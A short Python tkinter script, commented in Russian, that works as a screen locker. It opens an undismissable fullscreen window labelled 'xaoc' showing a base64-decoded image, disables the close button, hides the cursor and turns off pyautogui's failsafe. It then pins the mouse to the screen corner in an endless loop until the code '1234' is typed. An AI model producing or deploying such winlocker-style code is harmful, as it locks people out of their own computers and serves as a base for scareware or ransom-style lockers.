import base64
from io import BytesIO
from tkinter import Tk, Entry, Label
from PIL import Image, ImageTk
import pyautogui
import sys

root = Tk()


root.configure(bg='black')

label = Label(root, text="xaoc", font='Courier 8', fg='white', bg='black')
label.place(relx=.5, rely=.94, anchor="center")

# Закодированная строка base64 изображения
encoded_string = ""

# Преобразование строки base64 обратно в изображение
decoded_image = base64.b64decode(encoded_string)
image = Image.open(BytesIO(decoded_image))

#вывод изображения на экран
image = image.resize((400, 400), Image.ANTIALIAS)
photo = ImageTk.PhotoImage(image)
label_image = Label(root, image=photo, bg='black')
label_image.place(relx=.5, rely=.4, anchor="center")

entry = Entry(root, font='Courier 16')
entry.place(relx=.5, rely=.5, anchor="center", width=80, height=40)
entry.focus()

root.protocol('WM_DELETE_WINDOW', lambda: None)
root.attributes('-fullscreen', True)
root.config(cursor="none")
pyautogui.FAILSAFE = False

while True:
    pyautogui.moveTo(0, 0)
    root.update()
    if entry.get() == "1234":
        sys.exit()
